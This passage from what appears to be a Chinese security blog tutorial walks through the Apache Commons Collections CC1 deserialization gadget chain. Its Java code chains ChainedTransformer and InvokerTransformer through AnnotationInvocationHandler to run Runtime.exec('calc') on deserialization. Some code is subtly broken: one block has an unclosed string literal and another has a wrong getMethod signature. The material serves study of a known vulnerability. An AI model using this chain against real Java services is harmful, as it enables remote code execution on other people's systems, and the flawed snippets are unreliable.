![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYOibaiawrqxFBTdkkdmyte0L3VBltbNRyniaiblJotgUqibG7h28XybpjJww/640?wx_fmt=png&from=appmsg "")  
  
效果完全一致，但是最终我们的调用链没了，虽然可以把常量Transformer（ConstantTransformer）传进去了，但是无法调用起后面的那些类，即InvokerTransformer类和执行我们的危险方法。  
  
所以接下来该怎么办呢？  
  
当然是使用ChainedTransformer类。  
  
7  
  
ChainedTransformer类：  
  
它是传入一个transformer数组，然后链式调用数组里面的这些transformer，前一个transformer的输出是后一个transformer的输入。如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYY0NqL9KI3AKSfM2Auyicu5YKTmIKTkn5Vq6ALvoTAFhibGKTjP7MJuricQ/640?wx_fmt=png&from=appmsg "")  
  
接下来我们开始构造，如下：  
  
在ChainedTransformer()函数中传入我们的transformer数组，然后把之前构造好的两个常量transformer（ConstantTransformer）复制过来，分别是ConstantTransformer和invokerTransformer。最后把我们的两个常量transformer放到transformer数组中。  
  
**但是由于ChainedTransformer不管传入什么都返回的特性，你最终的ChainedTransformer.transformer传入什么都不重要了，链条也得以执行以至执行到我们的危险方法。**  
  
**现在我们开始调用我们的transformer，传入什么都行。**  
  
**然后现在的话我们就开始把我们的ChainedTransformer传给我们的增强Map，同样将前面构造好的增强Map复制过来，将ChainedTransformer传入进去。**  
  
**最后我们通过反射把我decorated.map（装饰好的map）复制过来。**  
  
**代码如下：**  
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;
import sun.reflect.annotation.AnnotationType;
import java.io.IOException;
import java.lang.annotation.Annotation;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import static org.apache.commons.collections.functors.ConstantTransformer.*;
public class CC1Test1 {
    
    @Test
    
    public void invokeExec() throws Exception {
        
    //Runtime.getRuntime().exec("calc");
        
        InvokerTransformer invokerTransformer = new InvokerTransformer(
            "exec",
            new Class[]{String.class},                
            new Object[]{"calc"}
        );
        
        //invokerTransformer.transform(Runtime.getRuntime());
        //Map decorated = TransformedMap.decorate(null,null, invokerTransformer);
        //TransformedMap.checkSetValue();
        
        HashMap<Object, Object> map = new HashMap<>();
        map.put("a", "b");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, invokerTransformer);
        
        for (Map.Entry<Object, Object> entry : decorated.entrySet()) {
            entry.setValue(Runtime.getRuntime());
        }
    }
    
    @Test
    
    public void invokeExec1() throws Exception {
        InvokerTransformer invokerTransformer = new InvokerTransformer(                
            "exec",                
            new Class[]{String.class},                
            new Object[]{"calc"}
        );
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "null");
        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, constantTransformer);
        
        for (Map.Entry<Object, Object> entry : decorated.entrySet()) {
            entry.setValue(null);
        }
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorated);
        CC.serialize(o);
        CC.unserialize("ser.bin");
    }
    
    @Test
    
    public void test() throws IOException{
        AnnotationType annotationType = AnnotationType.getInstance(Target.class);
        Map<String, Class<?>> memberTypes = annotationType.memberTypes();
        for (Map.Entry<String, Class<?>> entry : memberTypes.entrySet()) {
            System.out.println(entry);
        }
    }
    
    @Test
    public void test1() throws Exception {
        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
        InvokerTransformer invokerTransformer = new InvokerTransformer(
            "exec,
            new Class[]{String.class},
            new Object[]{"calc"}
        );
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
            constantTransformer,
            invokerTransformer
        });
        chainedTransformer.transform("随便不知道");
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "null");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, chainedTransformer);
        for (Map.Entry<Object, Object> entry : decorated.entrySet()) {
            entry.setValue(Runtime.getRuntime());
        }
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorated);
        CC.serialize(o);
        CC.unserialize("ser.bin");
    }
}
```  
  
执行程序：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYWODdJv8V1XnsAkBq33KNK46EjFX3WajG84gPIqibib4BJ1UkXRAXOn9Q/640?wx_fmt=png&from=appmsg "")  
  
我们发现报错了，那么这是为什么？以及该怎么调用呢？师傅们有奖竞猜欧~  
  
交流群里揭晓答案，这里就略过了。  
  
最后献上完整简化代码如下：  
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;
import sun.reflect.annotation.AnnotationType;
import java.io.IOException;
import java.lang.annotation.Annotation;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import static org.apache.commons.collections.functors.ConstantTransformer.*;
public class CC1Test1 {
    
    @Test
    
    public void test1() throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, chainedTransformer);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorated);
        CC.serialize(o);
        CC.unserialize("ser.bin");
    }
    
    @Test
    
    public void test2() throws Exception {
        Class clazz = Runtime.class;
        Method getRuntimeMethod = clazz.getMethod("getRuntime", String.class);
        Runtime invoke = (Runtime) getRuntimeMethod.invoke(null);

        Method execMethod = clazz.getMethod("exec", String.class);
        execMethod.invoke(invoke, "calc");
    }
}
```  
  
执行程序：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYHd1aZWet3JZeCmEVhzs0rGQxXfwoZM2BmObYcGGhehpFLUYu6m6RYQ/640?wx_fmt=png&from=appmsg "")  
  
成功弹出计算器！  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYvVsP0TgDicLVF9mmTg4dWMsDBgQta2ygFjzNn2Ik6A8icBaZzRjD7t4w/640?wx_fmt=gif&from=appmsg "")  
  
  
没看够~？欢迎关注！  
  
  
往期精彩推荐  
  
[工具篇 | 应急响应工具包，2025Hvv必备神器！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484242&idx=1&sn=654801a09da69a2b6467ad74066f7a23&chksm=c4cd78f3f3baf1e580d2047ae87565b189e2296091181310dd071d04203986d110eb930db3b8&scene=21#wechat_redirect)  
  
  
[Web篇 | 一文掌握Apache Commons Collections反序列化漏洞，速看！！！（上）](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484224&idx=1&sn=a9e9fa2b8726f6e7d464db9e4fb770d5&chksm=c4cd78e1f3baf1f7c99c20481ea73257d84255f0a722ee75d3b6bb46ebd94f4ebaad114add2c&scene=21#wechat_redirect)  
  
  
[Web篇 | 一文掌握Java反序列化漏洞，干货！（上）](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484143&idx=1&sn=4e41463a1d67c52d98086cdb7e669d87&chksm=c4cd794ef3baf058a19b88b73b7bbbb59647afcdd1dce5e30ef162c504b94980e3f57e969291&scene=21#wechat_redirect)  
  
  
[工具篇 | 把deepseek塞进微信：实现自动回复消息！王炸！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484067&idx=1&sn=f9ee4df873cfb533362d8b34c05e029a&chksm=c4cd7902f3baf014a045413eb15f889206053230ce22abe452fe2ed35f8cf08dc36d07dec057&scene=21#wechat_redirect)  
  
  
[内网篇 | 【送给小白的】内网信息收集：端口扫描详解，干货！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484038&idx=1&sn=3b827ae51c9d5434286f988e73fd1cc6&chksm=c4cd7927f3baf031ee942a99524d4b85c45275f9b5db99002f034517f88c96e5a4c7a39b1cec&scene=21#wechat_redirect)  
  
  
[漏洞复现篇 | CVE-2025-24813 Tomcat，最新RCE漏洞，速看！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484013&idx=1&sn=eeaeb65063f273191256799df00f72e7&chksm=c4cd79ccf3baf0da1ec8b93ff08a2bd94507517f99acbc26665e8c3e5431218ea9deab036d0c&scene=21#wechat_redirect)  
  
  
[内网篇 | 史上最全的内网IP扫描攻略，干货！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483973&idx=1&sn=2695c6362347532c1e7d0661083aed06&chksm=c4cd79e4f3baf0f2236b0861775c8fbcaca94337628e5a2a47a008db8dd053796f98dbee12ed&scene=21#wechat_redirect)  
  
  
[内网篇 | 干货！深入解析NTLM协议：挑战-响应认证机制揭秘，红队必备！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483943&idx=1&sn=5c1ae9d03e36744dc30b6953dbb99f71&chksm=c4cd7986f3baf0909a70df8b2959ed6d54e9e6bc21cf721a41d0d1f3f526dbec3d10f949916b&scene=21#wechat_redirect)  
  
  
[漏洞复现篇 | Ecshop SQL注入引起的任意代码执行漏洞](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483716&idx=1&sn=90b4cab022a7b1f8dfcbfc4e07223248&chksm=c4cd7ae5f3baf3f31f4007a5623dc524378cdd39a05f655e617de5f4005abe5e8bd70fda3f8d&scene=21#wechat_redirect)  
  
  
[SRC篇 | 如此简单的逻辑漏洞，速看！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483764&idx=1&sn=91a19aa1c243a20a06f4a25279577dac&chksm=c4cd7ad5f3baf3c3601dcb326f622615ad9ab20f6c936adb9320d650efa0314dc667eace3dd2&scene=21#wechat_redirect)  
  
  
[内网篇 | 干货！Windows系统本地认证](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483744&idx=1&sn=bac6aa7f4ceff25a48dd82af551f1069&chksm=c4cd7ac1f3baf3d702c046875602cc14873d0f9b4942c9a0359d5eb70a490ecc884026cb275c&scene=21#wechat_redirect)  
  
  
[红队必备：一文教你掌握pwd抓取技术，让你秒变高手！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483834&idx=1&sn=6447704059712e67ed4923b95462b336&chksm=c4cd7a1bf3baf30d868fac4ba6ae0ebe43e54ec64133d98fe63afe2a3635f01fdad091aaa994&scene=21#wechat_redirect)  
  
  
[SRC篇 | 今天你挖洞了吗？Webpack未授权访问漏洞，实战！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483870&idx=1&sn=5ac2a2d40a96f8741e79af9f0fe90655&chksm=c4cd7a7ff3baf369d9146ba745e86eb47e88a43b718db03778e976ffd7a353599e79c7580c76&scene=21#wechat_redirect)  
  
  
[Web篇 | 最强sqlmap联动burpsuite+WAF绕过姿势，Hvv面试必备！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483898&idx=1&sn=ce2f4bed8142958c1ed451fb59afac8a&chksm=c4cd7a5bf3baf34d58a6b334893de1c2d274820e2d40e7c057f182bad558bc3cba2e019d9916&scene=21#wechat_redirect)  
  
  
[Web篇 | 技巧！布尔盲注-利用burpsuite实现半自动化](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483687&idx=1&sn=e5c92d434ba5aaa1af2b4a295d742126&chksm=c4cd7a86f3baf390d2b385ab0475a70ef0f56d0f4538d17a186a0d06af14d0c2403157649931&scene=21#wechat_redirect)  
  
  
